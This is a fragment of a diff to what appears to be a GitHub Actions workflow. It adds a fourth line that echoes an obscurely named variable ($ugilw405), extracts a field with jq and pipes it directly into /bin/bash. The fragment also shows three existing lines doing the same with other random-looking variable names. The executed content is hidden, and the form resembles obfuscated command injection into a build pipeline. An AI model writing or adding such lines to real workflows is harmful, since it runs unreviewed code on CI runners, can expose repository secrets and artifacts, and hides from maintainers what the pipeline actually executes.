@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$b0" | jq -r .ruft89 | /bin/bash
           echo $bd135 | jq -r .cpwny596 | /bin/bash
           echo $tohd53 | jq -r .n08592 | /bin/bash
+          echo $ugilw405 | jq -r .ffz32 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
